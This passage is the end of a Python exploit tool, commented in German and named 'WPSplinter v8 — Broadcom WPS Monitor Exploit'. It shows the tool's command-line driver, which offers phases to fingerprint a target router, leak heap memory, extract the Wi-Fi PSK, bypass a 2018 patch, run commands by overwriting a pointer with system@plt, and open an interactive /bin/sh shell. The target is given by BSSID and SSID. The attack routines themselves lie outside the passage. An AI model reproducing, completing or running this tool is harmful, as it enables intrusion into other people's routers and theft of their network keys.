            print(f"  {off:08x}  {hexs:<{width*3}}  {txt}")

    def close(self):
        if self.dump and self.packets:
            wrpcap(self.dump, self.packets)
            logger.info(f"[+] {len(self.packets)} Pakete -> {self.dump}")


class StationStateLost(Exception):
    def __init__(self, action, reason):
        super().__init__(f"station state lost: {action} reason={reason}")
        self.action, self.reason = action, reason


class WpsError(Exception):
    pass


# =============================================================================
# CLI
# =============================================================================

def main():
    ap = argparse.ArgumentParser(
        description="WPSplinter v8 — Broadcom WPS Monitor Exploit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Phasen:
  fingerprint     Nicht-invasiver Zero-Length-Differenzial-Fingerprint [10]
  vuln_probe      Oversize-total-Probe (FRAG-ACK => Reassembly verwundbar)
  leak            last_sent_len-Overflow -> Memory Disclosure
  extract_psk     Heap nach PSK durchsuchen
  m2d_leak        M2D-Integer-Overread [2]
  bypass_2018     Integer-Underflow gegen den 2018er Patch [2]
  rce             send_data = system@plt (benötigt --system_plt!)
  shell           RCE mit /bin/sh -i

Hinweis: Es existiert KEIN CVE für diese Schwachstelle [1].
""")
    ap.add_argument("--iface", required=True)
    ap.add_argument("--bssid", required=True)
    ap.add_argument("--ssid", required=True)
    ap.add_argument("--channel", type=int)
    ap.add_argument("--phase", required=True,
                    choices=["fingerprint", "vuln_probe", "leak",
                             "extract_psk", "m2d_leak", "bypass_2018",
                             "rce", "shell"])
    ap.add_argument("--profile", choices=sorted(DEVICE_PROFILES),
                    help="Geräteprofil (setzt arch/endianness-Vorgaben)")
    ap.add_argument("--arch", choices=["arm", "mips"], default=None)
    ap.add_argument("--system_plt", type=lambda x: int(x, 0), default=None,
                   help="system@PLT (hex) — für rce/shelL zwingend")
    ap.add_argument("--cmd", default="id;#")
    ap.add_argument("--off_total_bytes", type=lambda x: int(x, 0),
                    default=OFF_TOTAL_BYTES)
    ap.add_argument("--off_last_sent_len", type=lambda x: int(x, 0),
                    default=OFF_LAST_SENT_LEN)
    ap.add_argument("--off_send_data", type=lambda x: int(x, 0),
                    default=OFF_SEND_DATA)
    ap.add_argument("--psk_offset", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--psk_size", type=int, default=4096)
    ap.add_argument("--leak_size", type=int, default=1024)
    ap.add_argument("--dump", default=None)
    ap.add_argument("-v", "--verbose", action="store_true")
    ap.add_argument("-d", "--debug", action="store_true")
    args = ap.parse_args()

    arch, big_endian, plt_default, _note = (
        DEVICE_PROFILES.get(args.profile, ("arm", "little", None, "")))
    if args.arch:
        arch = args.arch
        big_endian = (arch == "mips")
    if not args.profile and not args.arch:
        arch, big_endian = "arm", False

    w = WPSplinter(
        interface=args.iface, bssid=args.bssid, ssid=args.ssid,
        channel=args.channel, arch=arch, big_endian=big_endian,
        system_plt=args.system_plt or plt_default,
        off_total_bytes=args.off_total_bytes,
        off_last_sent_len=args.off_last_sent_len,
        off_send_data=args.off_send_data,
        dump=args.dump, verbose=args.verbose, debug=args.debug)

    rc = 2
    try:
        if args.phase == "fingerprint":
            rc = 0 if w.phase_fingerprint() else 1
        elif args.phase == "vuln_probe":
            rc = 0 if w.phase_vuln_probe() else 1
        elif args.phase == "leak":
            data = w.phase_leak(leak_size=args.leak_size)
            if data:
                w.hexdump(data)
            rc = 0 if data else 1
        elif args.phase == "extract_psk":
            psks = w.phase_extract_psk(scan_size=args.psk_size,
                                      base_offset=args.psk_offset)
            rc = 0 if psks else 1
        elif args.phase == "m2d_leak":
            data = w.phase_m2d_leak()
            if data:
                w.hexdump(data)
            rc = 0 if data else 1
        elif args.phase == "bypass_2018":
            rc = 0 if w.phase_bypass_2018() else 1
        elif args.phase == "rce":
            rc = 0 if w.phase_rce(args.cmd) else 1
        elif args.phase == "shell":
            rc = 0 if w.phase_shell() else 1
    except KeyboardInterrupt:
        print("\n[!] Abbruch durch Benutzer")
        rc = 130
    except (WpsError, StationStateLost) as e:
        print(f"[!] {e}")
        rc = 2
    finally:
        w.close()
    sys.exit(rc)


if __name__ == "__main__":
    main()
